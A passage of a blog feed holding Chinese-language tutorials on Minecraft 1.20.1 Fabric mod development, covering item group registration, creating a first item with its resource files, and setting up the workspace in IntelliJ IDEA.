class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerMyItemGroups</span><span class="params">()</span> {</span><br><span class="line">    Registry.register(Registries.ITEM_GROUP,</span><br><span class="line">            TUTORIAL_GROUP,</span><br><span class="line">            ItemGroup.create(ItemGroup.Row.TOP, <span class="number">7</span>)</span><br><span class="line">                    .displayName(Text.translatable(<span class="string">"itemGroup.tutorial-mod.tutorial_group"</span>))</span><br><span class="line">                    .icon(() -&gt; <span class="keyword">new</span> <span class="title class_">ItemStack</span>(ModItems.BLUE_POWDER))</span><br><span class="line">                    .entries((context, entries) -&gt; {</span><br><span class="line">                        entries.add(ModItems.BLUE_POWDER);</span><br><span class="line">                        entries.add(ModItems.PURPLE_POWDER);</span><br><span class="line">                    }).build());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>好像也挺不错？但是似乎又稍微麻烦了一点，需要写三个部分。</p><h3 id="写法三简化原生写法"><a class="markdownIt-Anchor" href="#写法三简化原生写法"></a> 写法三（简化原生写法）</h3><p>那么，可以尝试将上面的原生写法进行简化：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法三： 简化Vanilla API 写法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ItemGroup</span> <span class="variable">TUTORIAL_GROUP</span> <span class="operator">=</span> Registry.register(</span><br><span class="line">        Registries.ITEM_GROUP,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Identifier</span>(<span class="string">"tutorial-mod"</span>, <span class="string">"tutorial_group"</span>),</span><br><span class="line">        ItemGroup.create(ItemGroup.Row.TOP, <span class="number">7</span>) <span class="comment">// 可选位置参数</span></span><br><span class="line">                .icon(() -&gt; <span class="keyword">new</span> <span class="title class_">ItemStack</span>(ModItems.BLUE_POWDER))</span><br><span class="line">                .displayName(Text.translatable(<span class="string">"itemGroup.tutorial-mod.tutorial_group"</span>))</span><br><span class="line">                .entries((context, entries) -&gt; {</span><br><span class="line">                    entries.add(ModItems.BLUE_POWDER);</span><br><span class="line">                    entries.add(ModItems.PURPLE_POWDER);</span><br><span class="line">                })</span><br><span class="line">                .build()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerMyItemGroups</span><span class="params">()</span> {</span><br><span class="line">    TutorialMod.LOGGER.info(<span class="string">"fk-ItemGroups: registered new item group using vanilla builder"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种写法将方法二的构造、注册、返回链式的串在一起，声明即注册。</p><h2 id="三种写法的优劣"><a class="markdownIt-Anchor" href="#三种写法的优劣"></a> 三种写法的优劣</h2><p>其实优劣谈不上，这主要看构建 Mod 的目的是什么，是快速得到一个简单的 mod？还是它长期更新维护且可能涉及多人协作？我的考虑基于后者，会更推荐第二种写法：原生写法加上显式声明 <code>RegistryKey</code>。这使得它更容易维护，并且显式声明 <code>RegistryKey</code> 也支持数据生成，风格标准。参考表如下：</p><table><thead><tr><th>写法</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td>写法一（Fabric API）</td><td>简洁；API 现代；链式风格</td><td>不支持数据生成；不原生；依赖 Fabric API</td><td> 快速开发、小型项目</td></tr><tr><td>写法二（Vanilla + RegistryKey）</td><td>支持数据生成；结构清晰；可扩展性强</td><td>稍微繁琐一点</td><td>中大型项目、多人协作、需要数据生成</td></tr><tr><td>写法三（简化 Vanilla）</td><td>语法最短；直观；快速上手</td><td>不适配数据生成；不易重用</td><td>学习阶段、测试用途</td></tr></tbody></table><blockquote><p>PS：以后就不提版本控制和运行测试了，大家自己操作就行。</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fabric </tag>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fabric 模组开发 - Minecraft1.20.1：#2. 创建第一个物品</title>
      <link href="/posts/14171.html"/>
      <url>/posts/14171.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="注册类别介绍"><a class="markdownIt-Anchor" href="#注册类别介绍"></a> 注册类别介绍</h2><p>添加基本的物品是编写模组的第一步。基本逻辑是创建 <code>Item</code> 对象，注册，并提供纹理。要向物品添加其他行为，就需要编写自定义的 <code>Item</code> 类。</p><p>但在这之前，有必要了解一下 Minecraft 中常见的注册内容类别：</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left"> Java 类</th><th style="text-align:left">举例</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><strong> Item（物品）</strong></td><td style="text-align:left"><code>net.minecraft.item.Item</code></td><td style="text-align:left">铁锭、剑、药水</td><td style="text-align:left">所有背包里的物体（不一定是方块）</td></tr><tr><td style="text-align:left"><strong>Block（方块）</strong></td><td style="text-align:left"><code>net.minecraft.block.Block</code></td><td style="text-align:left">石头、熔炉、小麦地块</td><td style="text-align:left">可以放在世界里的立体方块</td></tr><tr><td style="text-align:left"><strong> BlockItem（方块物品）</strong></td><td style="text-align:left"><code>net.minecraft.item.BlockItem</code></td><td style="text-align:left">石头物品、栅栏物品</td><td style="text-align:left">在背包中代表某个方块的 “物品形式”</td></tr><tr><td style="text-align:left"><strong>Entity Type（实体）</strong></td><td style="text-align:left"><code>EntityType&lt;?&gt;</code></td><td style="text-align:left">僵尸、箭、村民</td><td style="text-align:left">会动的东西（生物、投掷物）</td></tr><tr><td style="text-align:left"><strong>Sound Event（声音事件）</strong></td><td style="text-align:left"><code>SoundEvent</code></td><td style="text-align:left">挖掘声、击中声</td><td style="text-align:left">可播放的音效事件</td></tr><tr><td style="text-align:left"><strong> Fluid（流体）</strong></td><td style="text-align:left"><code>Fluid</code></td><td style="text-align:left">水、岩浆、自定义油</td><td style="text-align:left">可流动的液体类型</td></tr><tr><td style="text-align:left"><strong> Enchantment（附魔）</strong></td><td style="text-align:left"><code>Enchantment</code></td><td style="text-align:left">锋利、经验修补</td><td style="text-align:left">给物品附加能力的系统</td></tr><tr><td style="text-align:left"><strong> Potion（药水类型）</strong></td><td style="text-align:left"><code>Potion</code></td><td style="text-align:left">治疗、跳跃、力量</td><td style="text-align:left">药水本身的类型（不是瓶子）</td></tr><tr><td style="text-align:left"><strong>StatusEffect（状态效果）</strong></td><td style="text-align:left"><code>StatusEffect</code></td><td style="text-align:left">中毒、再生</td><td style="text-align:left">药水或食物带来的效果</td></tr><tr><td style="text-align:left"><strong> RecipeSerializer / RecipeType（合成配方）</strong></td><td style="text-align:left"><code>RecipeSerializer</code>, <code>RecipeType</code></td><td style="text-align:left">合成表、锻造、熔炉配方</td><td style="text-align:left">定义如何制作物品</td></tr><tr><td style="text-align:left"><strong> ItemGroup（创意模式标签）</strong></td><td style="text-align:left"><code>ItemGroup</code></td><td style="text-align:left">红石、装饰方块</td><td style="text-align:left">创造模式分类标签</td></tr></tbody></table><h2 id="创建物品"><a class="markdownIt-Anchor" href="#创建物品"></a> 创建物品</h2><p>在 <code>java/com/frozen/tutorialmod/</code> 下创建 <code>item</code> 软件包，用来存放相关物品实例项和注册表项。接着在 <code>item</code> 包下创建 <code>ModItems</code> 类，我们将在这个类中编写实例物品和注册方法。</p><p>类有了，方法哪来？Fabric 端可以参考 Minecraft 的物品创建方式，使用 IDEA 快捷键双击 <code>shift</code> 打开搜索面板，搜索 <code>net.minecraft.item</code> 的 <code>Items</code> 类（搜索位置为所有位置）：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261603510.png" alt="image-20250726160337401"></p><blockquote><p>基本上，一个单词若是 <code>Item</code>，在 MC 大概率是定义物品基本属性的，而 <code>Items</code> 则是注册方面的。</p></blockquote><p>打开该文件，我们搜索（快捷键是 ctrl+f）<code>diamond</code> 钻石这一单词，找到这个最简单的物品，观察它是何如被 MC 实现的：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261613204.png" alt="image-20250726161340167"></p><p>可以看到 <code>DIAMOND</code> 被一个 <code>register</code> 方法进行注册，于是我们使用鼠标选中这个 <code>register</code>，点击鼠标中键进行跳转，观察 <code>register</code> 方法（或者按住 Ctrl 建对 <code>register</code> 点击鼠标左键）：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261619081.png" alt="image-20250726161901011"></p><p>可以看到从上到下总共存在三个静态注册物品的方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(String id, Item item)</span> {</span><br><span class="line">  <span class="keyword">return</span> register(<span class="keyword">new</span> <span class="title class_">Identifier</span>(id), item);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(Identifier id, Item item)</span> {</span><br><span class="line">  <span class="keyword">return</span> register(RegistryKey.of(Registries.ITEM.getKey(), id), item);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(RegistryKey&lt;Item&gt; key, Item item)</span> {</span><br><span class="line">  <span class="keyword">if</span> (item <span class="keyword">instanceof</span> BlockItem) {</span><br><span class="line">    ((BlockItem)item).appendBlocks(Item.BLOCK_ITEMS, item);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Registry.register(Registries.ITEM, key, item);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><details class="folding-tag"><summary> 看不懂？点我展开！ </summary>              <div class="content">              <p>首先，这三个方法的调用顺序如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261642911.png" alt="image-20250726164216874"></p><p><strong>第一个方法</strong>，帮你把要创建的物品标记上你指定的名字。但 <code>Identifier</code> 它本身<strong>不包含任何其他基本信息</strong>，是不知道你在注册物品还是方块的，所以需要第二个方法进一步增强类型安全。具体来说，主要是接收你定义的物品名字 <code>String id</code>，并将其转换为 <code>Identifier</code> 对象，<code>Item item</code> 参数若没有对物品基本属性进行指定则使用默认属性，然后将这俩作为参数传入给第二个 <code>register</code> 方法进一步增强类型安全。</p><blockquote><p>其中的 <code>Identifier</code> 是 MC 用来标识资源的类，就是用来声明一个名字。格式为：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Identifier</span>(<span class="string">"mod_id"</span>, <span class="string">"item_name"</span>) <span class="comment">// 比如: tutorial-mod:blue_powder</span></span><br></pre></td></tr></tbody></table></figure><p>在 <code>1.21</code> 之前一般是通过 <code>new Identifier("namespace", "path")</code> 或 <code>new Identifier("namespace:path")</code> 的方式进行使用，这里第一个方法只传入了 id，那么默认将会使用 mod 的 <code>id</code> 作为 <code>namespace</code> 命名空间，所以用来给 Mod 物品做标识需要引入 Mod 的 ID。（此处可参考 <a href="https://wiki.fabricmc.net/zh_cn:tutorial:items">Fabric Wiki</a>）</p></blockquote><p><strong>第二个方法</strong>，把第一个方法传来的 <code>Identifier</code> 结合 <code>item</code> 属性转换成了 <code>RegistryKey&lt;Item&gt;</code>。<code>RegistryKey&lt;T&gt;</code> 是一个键对象，表示<strong>某个注册表中某个项目的唯一标识</strong>。例如第二个方法中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegistryKey.of(Registries.ITEM.getKey(), id)</span><br></pre></td></tr></tbody></table></figure><p>相当于：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegistryKey&lt;Item&gt; itemKey = RegistryKey.of(Registries.ITEM.getKey(), <span class="keyword">new</span> <span class="title class_">Identifier</span>(<span class="string">"my_mod"</span>, <span class="string">"my_item"</span>));</span><br></pre></td></tr></tbody></table></figure><blockquote><p>而 <code>Registries.ITEM</code> 是一个 <code>Registry&lt;Item&gt;</code>，代表的是 Minecraft 的 <code>ITEM物品</code>注册表。</p></blockquote><p>所以这个意思是：“这是一个 <code>Item</code> 类型注册表里的条目，它的 ID 是 <code>my_mod:my_item</code>”。<br>所以，第二个方法主要是让注册系统知道你是在哪个注册表中注册哪个对象。</p><p><strong>第三个方法</strong>，存在 <code>Registry.register()</code> 语句，为真正执行注册的操作。对于 <code>if</code> 语句，它的作用很明显，主要是判断当前注册的物品是否为 <code>BlockItem</code> 方块物品。</p><blockquote><p>如果为真则会将这个物品加入到 <code>Item.BLOCK_ITEMS</code> 这个静态 Map 中，而这个 Map 是一个从 <code>Block</code> 到 <code>Item</code> 的映射，用于在需要时（比如显示方块物品）找到对应的物品。</p></blockquote><p>真正执行注册的语句是：<code>Registry.register(Registries.ITEM, key, item)</code>，意思很明显了，使用 <code>Registry</code> 大注册表的 <code>register</code> 注册方法将物品注册到注册表，括号内指明要注册的注册表（Registeries.ITEM）、键名（key）和基本属性（item）。</p>              </div>            </details><p>我们将这三个注册方法直接复制粘贴到 <code>java/com/frozen/tutorialmod/item/ModItems.java</code> 中来，然后将第一个注册方法使用到的 id 改为我们 Mod 的 ID：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModItems</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(String id, Item item)</span> {</span><br><span class="line">        <span class="keyword">return</span> register(<span class="keyword">new</span> <span class="title class_">Identifier</span>(TutorialMod.MOD_ID, id), item);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(Identifier id, Item item)</span> {</span><br><span class="line">        <span class="keyword">return</span> register(RegistryKey.of(Registries.ITEM.getKey(), id), item);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">register</span><span class="params">(RegistryKey&lt;Item&gt; key, Item item)</span> {</span><br><span class="line">        <span class="keyword">if</span> (item <span class="keyword">instanceof</span> BlockItem) {</span><br><span class="line">            ((BlockItem)item).appendBlocks(Item.BLOCK_ITEMS, item);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Registry.register(Registries.ITEM, key, item);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>现在注册方法有了，我们就可以开始注册物品实例了（<code>ModItems.java</code>）：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册一个紫色粉末，最大堆叠数量为30</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Item</span> <span class="variable">PURPLE_POWDER</span> <span class="operator">=</span> register(<span class="string">"purple_powder"</span>, <span class="keyword">new</span> <span class="title class_">Item</span>(<span class="keyword">new</span> <span class="title class_">Item</span>.Settings().maxCount(<span class="number">30</span>)));</span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>new Item(new Item.Settings().maxCount(30))</code> 中的<code>.maxCount()</code> 是不必须的，仅作演示。<br>你可以通过 <code>new Item.Settings()</code> 后接一个<code>.</code> 来唤起很多属性方法。</p></blockquote><h2 id="分类的重要性"><a class="markdownIt-Anchor" href="#分类的重要性"></a> 分类的重要性</h2><p>可以看到，现在我们注册的物品是不分类别的，因为我们的项目现在相对来说还较为简单，但是一旦物品数量多到不得不分类的时候，我们等到那时候再去修改吗？这也不太现实，维护成本巨大。所以，对物品进行分门别类是很重要的。</p><p>分门别类这一操作在代码体现上，实际是对注册的物品写好路径（<code>ModItems.java</code>）：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Item</span> <span class="variable">PURPLE_POWDER</span> <span class="operator">=</span> register(<span class="string">"purple_powder"</span>, <span class="keyword">new</span> <span class="title class_">Item</span>(<span class="keyword">new</span> <span class="title class_">Item</span>.Settings().maxCount(<span class="number">30</span>))); <span class="comment">// 注册一个紫色粉末，最大堆叠数量为30</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Item</span> <span class="variable">BLUE_POWDER</span> <span class="operator">=</span> register(<span class="string">"material/blue_powder"</span>, <span class="keyword">new</span> <span class="title class_">Item</span>(<span class="keyword">new</span> <span class="title class_">Item</span>.Settings().maxCount(<span class="number">30</span>))); <span class="comment">// 注册一个蓝色粉末，最大堆叠数量为30</span></span><br></pre></td></tr></tbody></table></figure><p>在对蓝色粉末进行注册的时候， 我们在 <code>"bule_powder"</code> 中使用 <code>/</code> 路径符完成路径的编写。索性，把紫色粉末也加入原材料的类别中吧（<code>ModItems.java</code>）：</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- public static final Item PURPLE_POWDER = register("purple_powder", new Item(new Item.Settings().maxCount(30))); // 注册一个紫色粉末，最大堆叠数量为30</span></span><br><span class="line"><span class="addition">+ public static final Item PURPLE_POWDER = register("material/purple_powder", new Item(new Item.Settings().maxCount(30))); // 注册一个紫色粉末，最大堆叠数量为30</span></span><br></pre></td></tr></tbody></table></figure><p>完成分类的操作，这将会在后面使用数据生成的时候，极大的方便资源的查找。</p><h2 id="完成注册"><a class="markdownIt-Anchor" href="#完成注册"></a> 完成注册</h2><p>接下来还要为 <code>ModItems.java</code> 加上一个静态的方法用来辅助我们注册：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerItems</span><span class="params">()</span> {</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>该方法暂无需做任何事，只需要在主类 <code>java/com/frozen/tutorialmod/TutorialMod.java</code> 中进行调用即可：</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  @Override</span><br><span class="line">  public void onInitialize() {</span><br><span class="line"><span class="addition">+   ModItems.registerItems();</span></span><br><span class="line">    LOGGER.info("Hello Fabric world!");</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>这是 Java 的特性。类在首次使用时会被加载并初始化，所有静态字段也就被初始化了且只初始化一次，避免重复注册。</p><h2 id="添加资源文件"><a class="markdownIt-Anchor" href="#添加资源文件"></a> 添加资源文件</h2><p>在 <code>resources/assets/tutorial-mod</code> 中新建：</p><ol><li><code>lang</code> 包：存放语言文件。如 <code>en_us.json</code>、<code>zh_cn.json</code> 等，若其他语言文件损坏将默认采用 <code>en_us.json</code></li><li><code>models</code> 包：存放模型文件。</li><li><code>textures</code> 包：存放贴图文件。</li></ol><p><code>lang</code> 包，我们完成 <code>en_us.json</code> 文件的编写：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"item.tutorial-mod.material.purple_powder"</span><span class="punctuation">:</span> <span class="string">"purple Powder"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"item.tutorial-mod.material.blue_powder"</span><span class="punctuation">:</span> <span class="string">"Blue Powder"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>也就是：<code>内容类别.namespace.路径名（如果有）.内容名</code>的格式。而中文语言文件，只需要把对应的值写成中文就可以了：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"item.tutorial-mod.material.purple_powder"</span><span class="punctuation">:</span> <span class="string">"紫色粉末"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"item.tutorial-mod.material.blue_powder"</span><span class="punctuation">:</span> <span class="string">"蓝色粉末"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p><code>models</code> 包，新建两个软件包：<code>block</code> 和 <code>item</code> 包，对于 <code>textures</code> 包也是如此（请注意单复数区别）。</p><p>在 <code>resources/assets/tutorial-mod/models/item/</code> 中创建 <code>material</code> 包（若没有分类则不需要创建该软件包直接新建 json 文件），并在这个包内创建 <code>purple_powder.json</code>（文件名和注册时写的物品名一致）：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"item/generated"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"textures"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"layer0"</span><span class="punctuation">:</span> <span class="string">"tutorial-mod:item/purple_powder"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><div class="note warning flat"><p>物品模型的 <code>parent</code> 改变了物品在手中以及在物品栏内等情形下的渲染。<code>item/generated</code> 用于许多简单的物品。<code>item/handheld</code> 用于手持其纹理左下角的物品。</p><p>如果在 <code>textures</code> 包的 <code>item</code> 也新建 <code>material</code> 软件包的话，<code>purple_powder.json</code> 需要将 <code>"tutorial-mod:item/purple_powder"</code> 修改为 <code>"tutorial-mod:item/material/purple_powder"</code></p></div><p>看到这个 <code>models</code> 里面的 <code>textures</code> 就是来指定 <code>assets</code> 的 <code>textures</code> 中具体的面数，我们这个物品比较简单，所以就是一个面数就行。</p><p>在 <code>resources/assets/tutorial-mod/textures/item/material/</code> 中，将准备好的贴图文件放到该目录下（文件格式为 png，且文件名和你定义的物品名一致）。</p><p>我的图片是：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261848667.png" alt="blue_powder"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261849632.png" alt="purple_powder"></p><h2 id="贴图素材网站"><a class="markdownIt-Anchor" href="#贴图素材网站"></a> 贴图素材网站</h2><ol><li><a href="https://minecraft.novaskin.me/resourcepacks">NOVA SKIN</a>：能在线修改 MC 本体的内容素材并免费下载到本地。</li><li><a href="https://www.planetminecraft.com/texture-packs/">Plant Minecraft-Texture Packs</a>：主要是用户上传的素材。</li></ol><p>如果有更好的网站，欢迎推荐！</p><h2 id="运行测试"><a class="markdownIt-Anchor" href="#运行测试"></a> 运行测试</h2><p>至此，已经可以尝试运行 MC 进行测试了。由于我们还没有完成物品组的创建，所以在游戏中无法直接获取到物品。不过我们可以通过 <code>/give</code> 指令来测试，例如：<code>/give Player537 tutorial-mod:material/blue_powder</code>，最终效果如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507261910720.png" alt="image-20250726191020648"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fabric </tag>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fabric 模组开发 - Minecraft1.20.1：#1. 初始化工作区布置</title>
      <link href="/posts/21458.html"/>
      <url>/posts/21458.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p><s>我重生了，上一世我没能坚持学习 Fabric Modding 导致未能幸存，这一世我要拿回属于我的一切😤</s></p><p>一直以来想学着做一个 mod 供自己玩，于是在此记录学习过程，鞭策自己学下去。</p><blockquote><p>平台：Windows11<br>Java 版本：Java 21<br>Minecraft 版本：1.20.1<br>Git 版本：git version 2.50.1.windows.1<br>IDE：IntelliJ IDEA Community Edition 2025.1.3（以下将简称为 IDEA）</p></blockquote><h2 id="fabric模板项目"><a class="markdownIt-Anchor" href="#fabric模板项目"></a> Fabric 模板项目</h2><p>推荐使用 Fabric 官方提供的模板项目开始学习。你可以<a href="https://fabricmc.net/develop/template/">点击</a>进行跳转：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231742309.png" alt="image-20250723174244140"></p><p>Minecraft 版本为 1.20.1 并且在高级选项中，将 <code>Data Generation</code> 勾选上，取消勾选 <code>Split client and common sources</code>。<code>Data Generation</code> 能让我们可以构建合成配方等资源，取消勾选拆分客户端和服务端代码是因为，初学者基本搞不清哪部分是服务器端代码哪部分是客户端代码，之后我们将手动进行拆解。</p><p>下载下来将压缩包解压，将目录中的 <code>LICENSE</code> 和<code>.github</code> 删除（前者为文件，后者为文件夹）。接着我们用 IDEA 将其作为工程项目打开。</p><h2 id="项目配置"><a class="markdownIt-Anchor" href="#项目配置"></a> 项目配置</h2><p>在使用 IDEA 将项目打开之后，优先检查以下设置：</p><ol><li>项目结构：将 SDK 设置为受支持的版本，现在 Fabric 模板项目部分依赖已经要求 SDK 为 21 所以我们选择为 21<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231800157.png" alt="image-20250723180039128"></li><li>IDEA 设置：将 Gradle 用户主目录从 C 盘更改到其他你喜欢的路径，并检查 Gradle 使用的 JVM 版本是否为 SDK 21<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231802505.png" alt="image-20250723180235470"></li></ol><p>都确认无误之后，别忘记点击应用并确定更改。</p><p>在打开项目，配置设置的这段时间，IDEA 会自动触发 gradle 下载依赖，构建速度取决于你的网络链接状态。构建完成时，你将会在日志输出界面看到 <code>BUILD SUCCESSFUL</code> 的字样：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231805501.png" alt="image-20250723180551406"></p><p>若你的 SDK 为 java 17 或其他版本，你可能会在构建的时候遇到下面的报错：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A problem occurred configuring root project <span class="string">'tutorial-mod-template-1.20.1'</span>.</span><br><span class="line">&gt; Could not resolve all artifacts <span class="keyword">for</span> configuration <span class="string">'classpath'</span>.</span><br><span class="line">   &gt; Could not resolve net.fabricmc:fabric-loom:1.11-SNAPSHOT.</span><br><span class="line">     Required by:</span><br><span class="line">         root project : &gt; fabric-loom:fabric-loom.gradle.plugin:1.11-SNAPSHOT:20250708.081131-4</span><br><span class="line">      &gt; Dependency requires at least JVM runtime version 21. This build uses a Java 17 JVM.</span><br><span class="line"></span><br><span class="line">* Try:</span><br><span class="line">&gt; Run this build using a Java 21 or newer JVM.</span><br><span class="line">&gt; Run with --stacktrace option to get the stack trace.</span><br><span class="line">&gt; Run with --info or --debug option to get more <span class="built_in">log</span> output.</span><br><span class="line">&gt; Run with --scan to get full insights.</span><br><span class="line">&gt; Get more <span class="built_in">help</span> at https://help.gradle.org.</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>该报错的原因是 <code>fabric-loom</code> 插件版本内部依赖了 Java 21+ 的功能或库，你可以在 <code>build.gradle</code> 和 <code>gradle.properties</code> 